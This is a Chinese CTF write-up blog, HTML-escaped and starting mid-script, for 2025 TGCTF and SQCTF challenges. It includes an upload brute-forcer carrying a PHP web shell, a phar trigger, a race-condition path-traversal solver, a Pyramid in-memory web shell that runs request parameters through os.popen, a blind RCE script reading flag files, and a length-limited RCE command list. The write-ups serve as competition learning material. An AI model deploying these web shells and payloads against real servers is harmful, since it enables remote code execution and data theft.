application/octet-stream\\r\\n\u0026#39;, \u0026#39;GIF89a\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\\r\\n\u0026#39;, # 内容后添加换行 f\u0026#39;--{boundary}--\\r\\n\u0026#39; ] try: # 修复2: 正确编码请求体 request_body = \u0026#39;\\r\\n\u0026#39;.join(data).encode(\u0026#39;utf-8\u0026#39;) response = requests.post( url, headers={ **headers, \u0026#34;Content-Type\u0026#34;: f\u0026#34;multipart/form-data; boundary={boundary}\u0026#34; }, data=request_body, # 使用正确编码的数据 timeout=5 ) # 修复3: 增强成功检测逻辑 success = False if response.status_code == 200: success = any(keyword in response.text.lower() for keyword in [\u0026#34;success\u0026#34;, \u0026#34;upload\u0026#34;, \u0026#34;path\u0026#34;]) elif 300 \u0026lt;= response.status_code \u0026lt; 400: success = True return (success, ext) except Exception as e: print(f\u0026#34;\\n[!] 测试 {ext} 时发生异常: {str(e)}\u0026#34;) return (False, ext) def brute_extensions(): # 优先测试高危扩展名 high_risk_exts = [\u0026#39;php\u0026#39;, \u0026#39;phtml\u0026#39;, \u0026#39;phar\u0026#39;, \u0026#39;inc\u0026#39;, \u0026#39;pgp\u0026#39;] # 生成所有三位组合 all_exts = (\u0026#39;\u0026#39;.join(c) for c in itertools.product(\u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39;, repeat=3)) with ThreadPoolExecutor(max_workers=20) as executor: # 提交任务 futures = {} # 优先测试高危扩展 for ext in high_risk_exts: future = executor.submit(test_extension, ext) futures[future] = ext # 提交全量组合 for ext in all_exts: if ext not in high_risk_exts: # 避免重复 future = executor.submit(test_extension, ext) futures[future] = ext # 实时处理结果 for future in as_completed(futures): success, ext = future.result() if success: print(f\u0026#34;\\n[+] 有效后缀发现: {ext}\u0026#34;) # 暴力终止所有线程 for f in futures: f.cancel() executor.shutdown(wait=False) return ext print(f\u0026#34;测试 {ext.ljust(8)}... 失败\u0026#34;, end=\u0026#39;\\r\u0026#39;, flush=True) print(\u0026#34;\\n[-] 未找到有效后缀\u0026#34;) return None if __name__ == \u0026#34;__main__\u0026#34;: brute_extensions() 接下来就是将生成的phar文件改后缀为atg，然后上传，然后get传参触发phar\n1 filename=phar://uploads/3xp.atg 再post执行命令就好\n老登，炸鱼来了？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;text/template\u0026#34; \u0026#34;time\u0026#34; ) // Note 代表一个笔记文件的信息 type Note struct { Name string // 文件名 ModTime string // 修改时间 Size int64 // 文件大小 IsMarkdown bool // 是否是Markdown文件 } // PageData 用于模板渲染的数据结构 type PageData struct { Notes []Note // 笔记列表 Error string // 错误信息 } // blackJack 检查路径是否包含危险字符 func blackJack(path string) error { if strings.Contains(path, \u0026#34;..\u0026#34;) || strings.Contains(path, \u0026#34;/\u0026#34;) || strings.Contains(path, \u0026#34;flag\u0026#34;) { return fmt.Errorf(\u0026#34;非法路径\u0026#34;) } return nil } // renderTemplate 渲染HTML模板 func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) { err := templates.ExecuteTemplate(w, tmpl, data) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } // renderError 渲染错误页面 func renderError(w http.ResponseWriter, message string, code int) { w.WriteHeader(code) templates.ExecuteTemplate(w, \u0026#34;error.html\u0026#34;, map[string]interface{}{ \u0026#34;Code\u0026#34;: code, \u0026#34;Message\u0026#34;: message, }) } var templates = template.Must(template.ParseGlob(\u0026#34;templates/*\u0026#34;)) // 模板引擎 func main() { os.Mkdir(\u0026#34;notes\u0026#34;, 0755) // 创建笔记存储目录 // 检查/flag路径（演示用，实际会返回错误） err := blackJack(\u0026#34;/flag\u0026#34;) if err != nil { fmt.Println(err) } // 主页路由：显示所有笔记 http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { files, err := os.ReadDir(\u0026#34;notes\u0026#34;) if err != nil { renderError(w, \u0026#34;读取笔记失败\u0026#34;, http.StatusInternalServerError) return } var notes []Note for _, f := range files { if f.IsDir() { continue } info, _ := f.Info() notes = append(notes, Note{ Name: f.Name(), ModTime: info.ModTime().Format(\u0026#34;2006-01-02 15:04\u0026#34;), Size: info.Size(), IsMarkdown: strings.HasSuffix(f.Name(), \u0026#34;.md\u0026#34;), }) } renderTemplate(w, \u0026#34;index.html\u0026#34;, PageData{Notes: notes}) }) // 读取笔记路由 http.HandleFunc(\u0026#34;/read\u0026#34;, func(w http.ResponseWriter, r *http.Request) { name := r.URL.Query().Get(\u0026#34;name\u0026#34;) if err := blackJack(name); err != nil { renderError(w, err.Error(), http.StatusBadRequest) return } file, err := os.Open(filepath.Join(\u0026#34;notes\u0026#34;, name)) if err != nil { renderError(w, \u0026#34;文件不存在\u0026#34;, http.StatusNotFound) return } defer file.Close() data, err := io.ReadAll(io.LimitReader(file, 10240)) if err != nil { renderError(w, \u0026#34;读取文件失败\u0026#34;, http.StatusInternalServerError) return } if strings.HasSuffix(name, \u0026#34;.md\u0026#34;) { w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;) fmt.Fprintf(w, `%s`, data) } else { w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/plain\u0026#34;) w.Write(data) } }) // 写入笔记路由 http.HandleFunc(\u0026#34;/write\u0026#34;, func(w http.ResponseWriter, r *http.Request) { if r.Method != \u0026#34;POST\u0026#34; { renderError(w, \u0026#34;方法不允许\u0026#34;, http.StatusMethodNotAllowed) return } name := r.FormValue(\u0026#34;name\u0026#34;) content := r.FormValue(\u0026#34;content\u0026#34;) if err := blackJack(name); err != nil { renderError(w, err.Error(), http.StatusBadRequest) return } // 根据格式参数决定文件扩展名 if r.FormValue(\u0026#34;format\u0026#34;) == \u0026#34;markdown\u0026#34; \u0026amp;\u0026amp; !strings.HasSuffix(name, \u0026#34;.md\u0026#34;) { name += \u0026#34;.md\u0026#34; } else { name += \u0026#34;.txt\u0026#34; } // 限制内容大小 if len(content) \u0026gt; 10240 { content = content[:10240] } err := os.WriteFile(filepath.Join(\u0026#34;notes\u0026#34;, name), []byte(content), 0600) if err != nil { renderError(w, \u0026#34;写入文件失败\u0026#34;, http.StatusInternalServerError) return } http.Redirect(w, r, \u0026#34;/\u0026#34;, http.StatusSeeOther) }) // 删除笔记路由 http.HandleFunc(\u0026#34;/delete\u0026#34;, func(w http.ResponseWriter, r *http.Request) { name := r.URL.Query().Get(\u0026#34;name\u0026#34;) if err := blackJack(name); err != nil { renderError(w, err.Error(), http.StatusBadRequest) return } err := os.Remove(filepath.Join(\u0026#34;notes\u0026#34;, name)) if err != nil { renderError(w, \u0026#34;删除文件失败\u0026#34;, http.StatusInternalServerError) return } http.Redirect(w, r, \u0026#34;/\u0026#34;, http.StatusSeeOther) }) // 静态文件路由 http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, http.FileServer(http.Dir(\u0026#34;static\u0026#34;)))) // 启动服务器 srv := \u0026amp;http.Server{ Addr: \u0026#34;:9046\u0026#34;, ReadTimeout: 10 * time.Second, WriteTimeout: 15 * time.Second, } log.Fatal(srv.ListenAndServe()) } 漏洞点是\n1 2 3 4 if safe = blackJack(name); safe / nil { renderError(w, safe.Error(), http.StatusBadRequest) return } 第一次输入一个任意的 name ，使得 safe 被赋值为 nil ，然后立刻读取flag，此时err 还会是 nil\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import aiohttp import asyncio import time class Solver: def __init__(self, baseUrl): # 初始化方法，设置基本URL和相关参数 self.baseUrl = baseUrl self.READ_FILE_ENDPOINT = f\u0026#39;{self.baseUrl}\u0026#39; # 用于读取文件的端点 self.VALID_CHECK_PARAMETER = \u0026#39;/read?name=1\u0026#39; # 有效参数，用于正常请求 self.INVALID_CHECK_PARAMETER = \u0026#39;/read?name=../../../flag\u0026#39; self.RACE_CONDITION_JOBS = 100 # 设置竞态条件的并发任务数量 async def raceValidationCheck(self, session, parameter): # 异步方法，用于发送GET请求并获取响应 url = f\u0026#39;{self.READ_FILE_ENDPOINT}{parameter}\u0026#39; # 构造请求URL async with session.get(url) as response: # 使用异步会话发送GET请求 return await response.text() # 返回响应文本 async def raceCondition(self, session): # 创建并行任务，模拟竞态条件 tasks = list() # 用于存储所有任务的列表 for _ in range(self.RACE_CONDITION_JOBS): # 循环创建指定数量的任务 tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER)) # 添加有效请求任务 tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER)) # 添加无效请求任务 return await asyncio.gather(*tasks) # 并行执行所有任务并返回结果 async def solve(self): # 主解决方法，尝试获取flag async with aiohttp.ClientSession() as session: # 创建异步HTTP客户端会话 attempts = 1 # 初始化尝试次数 finishedRaceConditionJobs = 0 # 初始化完成的任务数量 while True: # 无限循环，持续尝试 print(f\u0026#39;[*] Attempts: {attempts} - Finished race condition jobs: {finishedRaceConditionJobs}\u0026#39;) # 打印当前状态 results = await self.raceCondition(session) # 执行竞态条件任务并获取结果 attempts += 1 # 增加尝试次数 finishedRaceConditionJobs += self.RACE_CONDITION_JOBS # 更新完成的任务数量 for result in results: # 检查每个响应结果 if \u0026#39;TGCTF{\u0026#39; not in result: # 如果结果中不包含flag标志，跳过 continue print(f\u0026#39;\\n[+] We won the race window! Flag: {result.strip()}\u0026#39;) # 打印获取到的flag exit(0) # 成功后退出程序 if __name__ == \u0026#39;__main__\u0026#39;: # 程序入口 baseUrl = \u0026#39;http://127.0.0.1:52270/\u0026#39; # 目标服务器的URL（已修正拼写错误） solver = Solver(baseUrl) # 创建Solver实例 asyncio.run(solver.solve()) # 运行异步解决方法 熟悉的配方，熟悉的味道 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 from pyramid.config import Configurator # 导入 Pyramid 配置类 from pyramid.request import Request # 导入 Pyramid 请求类 from pyramid.response import Response # 导入 Pyramid 响应类 from pyramid.view import view_config # 导入 Pyramid 视图配置装饰器 from wsgiref.simple_server import make_server # 导入用于创建简单 WSGI 服务器的函数 from pyramid.events import NewResponse # 导入 Pyramid 新响应事件类 import re # 导入正则表达式模块 from jinja2 import Environment, BaseLoader # 导入 Jinja2 模板引擎相关类 # 定义一个全局字典，用于限制 eval 函数的执行环境，防止执行恶意代码 eval_globals = { \u0026#39;__builtins__\u0026#39;: {}, # 禁用所有内置函数 \u0026#39;__import__\u0026#39;: None # 禁止动态导入 } # 定义一个函数，用于检查用户输入的表达式是否符合要求 def checkExpr(expr_input): # 使用正则表达式将表达式按运算符分割为多个部分 expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) print(exec(expr_input)) # 执行表达式（此处可能存在安全隐患） # 如果分割后的表达式部分数量不等于 2，则返回 0 表示不符合要求 if len(expr) != 2: return 0 try: # 尝试将分割后的表达式部分转换为整数 int(expr[0]) int(expr[1]) except: # 如果转换失败，则返回 0 表示不符合要求 return 0 # 如果通过上述检查，则返回 1 表示符合要求 return 1 # 定义一个视图函数，用于处理主页请求 def home_view(request): expr_input = \u0026#34;\u0026#34; # 初始化表达式输入为空字符串 result = \u0026#34;\u0026#34; # 初始化计算结果为空字符串 # 如果请求方法是 POST if request.method == \u0026#39;POST\u0026#39;: # 获取用户提交的表达式 expr_input = request.POST[\u0026#39;expr\u0026#39;] # 检查表达式是否符合要求 if checkExpr(expr_input): try: # 在受限环境中计算表达式结果 result = eval(expr_input, eval_globals) except Exception as e: # 如果计算过程中出现异常，则将异常信息作为结果 result = e else: # 如果表达式不符合要求，则返回提示信息 result = \u0026#34;爬！\u0026#34; # 【xxx】处应填写模板字符串，用于渲染页面内容 template_str = 【xxx】 # 创建 Jinja2 模板环境，使用基础加载器 env = Environment(loader=BaseLoader()) # 从模板字符串中加载模板 template = env.from_string(template_str) # 渲染模板，将表达式输入和计算结果传递给模板 rendered = template.render(expr_input=expr_input, result=result) # 返回渲染后的响应内容 return Response(rendered) # 如果该脚本作为主程序运行 if __name__ == \u0026#39;__main__\u0026#39;: # 创建 Pyramid 配置对象 with Configurator() as config: # 添加一个名为 \u0026#39;home_view\u0026#39; 的路由，对应根路径 \u0026#39;/\u0026#39; config.add_route(\u0026#39;home_view\u0026#39;, \u0026#39;/\u0026#39;) # 将 home_view 函数配置为处理 \u0026#39;home_view\u0026#39; 路由的视图 config.add_view(home_view, route_name=\u0026#39;home_view\u0026#39;) # 根据配置生成 WSGI 应用程序 app = config.make_wsgi_app() # 创建一个 WSGI 服务器，监听所有网络接口的 9040 端口 server = make_server(\u0026#39;0.0.0.0\u0026#39;, 9040, app) # 启动服务器，开始处理请求 server.serve_forever() 对pyramid框架无回显的学习\u0026mdash;以一道ctf题目为例-先知社区\n打pyramid内存马 1 expr=exec(\u0026#34;import sys;config = sys.modules[\u0026#39;__main__\u0026#39;].config;app=sys.modules[\u0026#39;__main__\u0026#39;].app;print(config);config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;);config.add_view(lambda request: Response(__import__.(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;1\u0026#39;)).read()),route_name=\u0026#39;shell\u0026#39;);app = config.make_wsgi_app()\u0026#34;) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import sys #这行代码导入了Python的标准库模块sys，用于访问与Python解释器紧密相关的变量和函数。 config = sys.modules[\u0026#39;__main__\u0026#39;].config #这当前运行环境中存在名为config的对象，并且它是全局命名空间的一部分（即位于__main__模块中）。config对象通常用于存储应用程序配置信息，在Pyramid框架中，它还负责定义应用的行为，如路由规则等。 app = sys.modules[\u0026#39;__main__\u0026#39;].app #类似地，app也被认为是在全局命名空间中存在的一个变量，代表了WSGI兼容的应用实例。WSGI(Web Server Gateway Interface)是一种用于Python web应用和服务之间通信的标准接口。 print(config) #这行代码简单地打印出config对象的内容，为了更好调试，检查其是否正确加载。 config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;) #此行调用了config对象的方法add_route，用于向Web应用添加一个新的URL路由。这里的路由名称为\u0026#39;shell\u0026#39;，对应的路径是\u0026#39;/shell\u0026#39;。这意味着当用户访问这个特定的URL时，会触发与之关联的视图逻辑。 config.add_view(lambda request: Response(__import__(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;1\u0026#39;)).read()), route_name=\u0026#39;shell\u0026#39;) #这是关键的一行，它定义了一个匿名函数（lambda表达式），该函数接受一个request参数并返回一个HTTP响应。在这个过程中，它使用了__import__(\u0026#39;os\u0026#39;).popen(...)来执行操作系统命令。更具体地说，它从请求参数中获取键为\u0026#39;1\u0026#39;的值，并将其作为命令传递给系统shell执行。然后，它读取命令执行的结果，并通过Response对象将其作为HTTP响应体发送回客户端。 app = config.make_wsgi_app() #最后，这行代码调用了config上的make_wsgi_app方法，创建了一个新的WSGI应用实例，并将其赋值给app变量。这一步骤完成了应用的构建过程。 但是这里其实过滤了import，但是还是能打,原因\n1 2 3 4 5 6 7 exec 中执行的 import 语句其实是语法层级的关键词，它不是 __import__()，Python 的 import xxx 会在内部尝试调用 __import__，但如果模块已经存在于 sys.modules 里，它就直接复用缓存的模块，不再调用 __import__()，import os 成功了，是因为 os 已经在解释器环境中被加载过了，Python 就直接复用了，不再调用 __import__() 原理： import os --\u0026gt; 实际上调用 __import__(\u0026#39;os\u0026#39;) --\u0026gt; 先看 sys.modules 是否已经有 \u0026#39;os\u0026#39; --\u0026gt; 有的话直接复用，不调用 __import__() --\u0026gt; 没有才会去调用 __import__() 加载新模块 wp是\n1 2 expr=exec(\u0026#34;config.add_route(\u0026#39;shell_route\u0026#39;,\u0026#39;/shell\u0026#39;);config.add_view(lambda request:Response(__import__.(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;1\u0026#39;)).read()),route _name=\u0026#39;shell_route\u0026#39;);app = config.make_wsgi_app()\u0026#34;) 打时间盲注 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string # 导入字符串模块，用于生成待猜测的字符集 import requests # 导入requests库，用于发送HTTP请求 from tqdm import tqdm # 导入tqdm库，用于显示进度条 url = \u0026#34;http://127.0.0.1:50800/\u0026#34; # 目标URL地址 flag = \u0026#34;TGCTF{\u0026#34; # 初始化flag变量，存储已猜测出的旗帜字符串 # 外层循环，遍历旗帜字符串的每个位置，从当前flag长度开始，直到第50个字符位置 for i in range(len(flag), 50): # 内层循环，遍历待猜测的字符集，包括特定符号、小写字母和数字 for s in tqdm(\u0026#39;-\u0026#39;+\u0026#39;}\u0026#39;+\u0026#39;{\u0026#39;+string.ascii_lowercase+string.digits): # 构造POST请求的数据字典，包含恶意构造的表达式 # 该表达式通过读取目标文件的第i个字符并判断是否等于当前猜测字符s # 利用operator.eq进行字符比较，若相等则进行取倒数操作，导致服务端错误 data = {\u0026#34;expr\u0026#34;:f\u0026#34;import os,operator;f=os.popen(\u0026#39;cat /f*\u0026#39;).read();a=int(operator.eq(f[{i}],\u0026#39;{s}\u0026#39;));1/a\u0026#34;} # 发送POST请求到目标URL，携带构造的恶意表达式数据 res = requests.post(url, data=data) # 根据服务端返回的内容判断猜测是否正确 # 若返回内容不是特定的错误信息，则认为猜测正确 if res.text != \u0026#34;A server error occurred. Please contact the administrator.\u0026#34;: flag += s # 将正确猜测的字符添加到旗帜字符串 print(flag) # 打印当前已猜出的旗帜字符串 break # 跳出内层循环，继续猜测下一个字符位置 print(i) # 打印当前已猜测的字符位置索引 Cry 费克特尔 分解后是5个素数，ai梭了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from Crypto.Util.number import long_to_bytes import gmpy2 # ==================== 用户输入参数 ==================== n = 810544624661213367964996895060815354972889892659483948276203088055391907479553 e = 65537 c = 670610235999012099846283721569059674725712804950807955010725968103642359765806 # 分解后的5个素数（需自行验证分解正确性） factors = [ 113, # p1 18251, # p2 2001511, # p3 214168842768662180574654641, # p4 (示例值，需替换实际分解结果) 916848439436544911290378588839845528581 # p5 (示例值，需替换实际分解结果) ] # ==================== 分解验证 ==================== def validate_factors(): product = 1 for p in factors: assert gmpy2.is_prime(p), f\u0026#34;{p} 不是素数\u0026#34; # 网页6的素数验证 product *= p assert product == n, \u0026#34;分解结果乘积不等于n\u0026#34; # 网页3的核心验证 validate_factors() # ==================== 计算私钥 ==================== phi = 1 for p in factors: phi *= (p - 1) # 多素数RSA的欧拉函数计算（网页1原理） try: d = gmpy2.invert(e, phi) # 网页3的模逆元计算 except ZeroDivisionError: raise ValueError(\u0026#34;e与φ(n)不互质，无法生成私钥\u0026#34;) # ==================== 解密过程 ==================== m = pow(c, d, n) # ==================== 结果处理 ==================== m_bytes = long_to_bytes(m) # 安全解码策略（网页5的错误处理改进） try: print(\u0026#34;文本明文:\u0026#34;, m_bytes.decode(\u0026#39;utf-8\u0026#39;)) except UnicodeDecodeError: # 处理二进制数据（网页2的建议） print(\u0026#34;检测到非文本数据，16进制输出:\u0026#34;, m_bytes.hex()) with open(\u0026#39;decrypted_data.bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(m_bytes) print(\u0026#34;二进制文件已保存为 decrypted_data.bin\u0026#34;) mm不躲猫猫 将数据放在1.txt，然后提取解密就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import math from Crypto.Util.number import long_to_bytes # 读取数据 try: with open(\u0026#39;1.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: # 使用 utf-8 编码 lines = f.readlines() except UnicodeDecodeError: print(\u0026#34;无法用 utf-8 编码读取文件，请检查文件内容或尝试其他编码。\u0026#34;) exit(1) data = [] for line in lines: line = line.strip() if line.startswith(\u0026#39;n = \u0026#39;) or line.startswith(\u0026#39;c = \u0026#39;): key, value = line.split(\u0026#39; = \u0026#39;) data.append((key, int(value))) ns = [] cs = [] for i in range(0, len(data), 2): ns.append(data[i][1]) cs.append(data[i+1][1]) # 寻找共同的质因数 for i in range(len(ns)): for j in range(i + 1, len(ns)): n1 = ns[i] n2 = ns[j] gcd = math.gcd(n1, n2) if gcd != 1: print(f\u0026#34;Found common factor {gcd} between n[{i}] and n[{j}]\u0026#34;) # 分解 n1 和 n2 p1 = gcd q1 = n1 // p1 p2 = gcd q2 = n2 // p2 # 计算私钥 d phi1 = (p1 - 1) * (q1 - 1) phi2 = (p2 - 1) * (q2 - 1) e = 65537 d1 = pow(e, -1, phi1) d2 = pow(e, -1, phi2) # 解密 c m1 = pow(cs[i], d1, n1) m2 = pow(cs[j], d2, n2) print(f\u0026#34;Decrypted m1: {long_to_bytes(m1)}\u0026#34;) print(f\u0026#34;Decrypted m2: {long_to_bytes(m2)}\u0026#34;) tRwSiAns 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import hashlib from Crypto.Util.number import long_to_bytes from math import isqrt # 已知参数 n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839 e = 3 c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366 c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814 # 计算哈希值 def md5_hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) # 计算哈希值 h1 = md5_hash(307) h2 = md5_hash(7) # 计算差值 delta_h = h1 - h2 delta_c = c1 - c2 # 构造方程 # delta_c = (m + h1)^3 - (m + h2)^3 = 3*m^2*(h1 - h2) + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3) # 简化为：delta_c = 3*m^2*delta_h + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3) # 进一步简化为：delta_c = 3*delta_h*m^2 + 3*(h1^2 - h2^2)*m + (h1^3 - h2^3) # 除以 delta_h S = delta_c // delta_h # 构造二次方程：3*m^2 + 3*(h1 + h2)*m + (h1^2 + h1*h2 + h2^2) - S = 0 a = 3 b = 3 * (h1 + h2) c = h1**2 + h1*h2 + h2**2 - S # 计算判别式 delta = b**2 - 4*a*c sqrt_delta = isqrt(delta) # 检查是否为完全平方 if sqrt_delta * sqrt_delta != delta: raise ValueError(\u0026#34;判别式不是完全平方，无法求解。\u0026#34;) # 求解方程 m1 = (-b + sqrt_delta) // (2 * a) m2 = (-b - sqrt_delta) // (2 * a) # 尝试解码 for m in [m1, m2]: try: flag = long_to_bytes(m) if all(32 \u0026lt;= byte \u0026lt;= 126 for byte in flag): # 检查是否为可打印字符 print(\u0026#34;解密成功，FLAG 为：\u0026#34;, flag.decode()) break except: continue ","date":"2025-04-12T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-tgctf-write.up/","title":"2025-TGCTF-write.up"},{"content":"[TOC]\nWeb Upload_Level1 先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）\nMy Blog file.pdf有用户密码，目录扫描到login.php,登入框打前面的账号密码就可\nezGame 看到关键代码，一眼就是控制台改分数，控制台输obj.score = 10000; obj.getFlag(); 即可\n商师一日游 sqctf{\n8ec8\ne05422\n474602b\n873f0b36\na57c0\n3f}\n最终flag是sqctf{8ec8e05422474602b873f0b36a57c03f}\neeaassyy ctrl+u与右键禁用，打开更多工具，然后点开发人员工具即可看到。\n逃 deepseek一把梭\nbaby include 打日志包含\n唯一 直觉ssti，笔记就是note，过滤了一些关键词\n有点疑问，过滤了关键词，引号绕过不了，还得把下划线一起过滤才行\nThrough 目录穿越，写的很少，还需要双写绕过，payload：file=....//....//....///flag\n目录穿越/遍历漏洞 \u0026ndash; 学习笔记_目录遍历漏洞描述-CSDN博客\nFile_download 提示xml，那就是xml泄露，网上搜了差不多一样的题\n1 filename=WEB-INF/classes/com/ctf/flag/FlagManager.class 然后将这个乱码复制到一个txt文件，改后缀为class，然后跑到[/s/1744130315784/]的目录列表这个网站去java反编译，得到java文件\n接下来本来参考CTF攻防赛java反编译题_ctf class反编译-CSDN博客这个博客要运行代码，但是直接给deepseek梭了\n参考WEB-INF/web.xml泄露漏洞及其利用_web-inf-web-xml-disclosure-CSDN博客\n嘿嘿嘿 此题干扰不少，其实xxx,yyy用不到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 \u0026lt;?php class hhh { public $file; public $content; public function __construct($file, $content) { $this-\u0026gt;file = $file; $this-\u0026gt;content = $content; } public function __destruct() { if ($this-\u0026gt;file \u0026amp;\u0026amp; $this-\u0026gt;content) { if (strpos($this-\u0026gt;file, \u0026#39;flag\u0026#39;) !== false) { die(\u0026#34;No flag file!\u0026#34;); } if (file_exists($this-\u0026gt;file)) { die(\u0026#34;File already exists!\u0026#34;); } file_put_contents($this-\u0026gt;file, $this-\u0026gt;content); } } } class xxx { public $data; public function __construct($data) { $this-\u0026gt;data = $data; } public function __toString() { return $this-\u0026gt;data; } } class yyy { public $path; public $allowed; public function __construct($path, $allowed) { $this-\u0026gt;path = $path; $this-\u0026gt;allowed = $allowed; } public function __toString() { if ($this-\u0026gt;allowed) { return file_get_contents($this-\u0026gt;path); } else { return \u0026#34;Access Denied!\u0026#34;; } } } $obj=new hhh($file,$content); $obj-\u0026gt;file=\u0026#34;data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\u0026#34;; $obj-\u0026gt;content=\u0026#34;GET_FLAG\u0026#34;; // 生成序列化数据 $payload = serialize($obj); echo $payload; echo urlencode($payload); ?\u0026gt; 答案在源码！一开始我还以为无回显！还有，这里file可以直接为空，因为我这伪协议好像没任何作用，只是为了绕过waf而已，但是这里为空也行。这里是测试了一下file_get_content函数读file的话结果是base64解码后的值。\n参考：CG-CTF web之 file_get_contents_die(\u0026lsquo;file get contents! file! get! contents!\u0026rsquo;);-CSDN博客\nPing RceMe 这替自然还有高手做法\n有长度限制的rce - xiaolong\u0026rsquo;s blog\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/python # -*- coding: UTF-8 -*- import time import requests headers = {\u0026#39;User-Agent\u0026#39; : \u0026#39;ccc\u0026#39;} url = \u0026#34;http://challenge.qsnctf.com:31021/?com={0}\u0026#34; print(\u0026#34;[+]start attack!!!\u0026#34;) with open(\u0026#34;1.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: for i in f: print(\u0026#34;[*]\u0026#34; + url.format(i.strip())) time.sleep(1) requests.get(url.format(i.strip()),headers=headers) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026gt;ls\\\\ ls\u0026gt;_ \u0026gt;\\ \\\\ \u0026gt;-t\\\\ \u0026gt;\\\u0026gt;y ls\u0026gt;\u0026gt;_\t\u0026gt;hp \u0026gt;p\\\\ \u0026gt;1.\\\\ \u0026gt;\\\u0026gt;\\\\ \u0026gt;-d\\\\ \u0026gt;\\ \\\\ \u0026gt;64\\\\ \u0026gt;se\\\\ \u0026gt;ba\\\\ \u0026gt;\\|\\\\ \u0026gt;\\=\\\\ \u0026gt;w=\\\\ \u0026gt;pO\\\\ \u0026gt;V0\\\\ \u0026gt;bM\\\\ \u0026gt;1R\\\\ \u0026gt;PU\\\\ \u0026gt;1B\\\\ \u0026gt;kX\\\\ \u0026gt;Cg\\\\ \u0026gt;hb\\\\ \u0026gt;XZ\\\\ \u0026gt;gZ\\\\ \u0026gt;HA\\\\ \u0026gt;a\\\\ \u0026gt;9w\\\\ \u0026gt;PD\\\\ 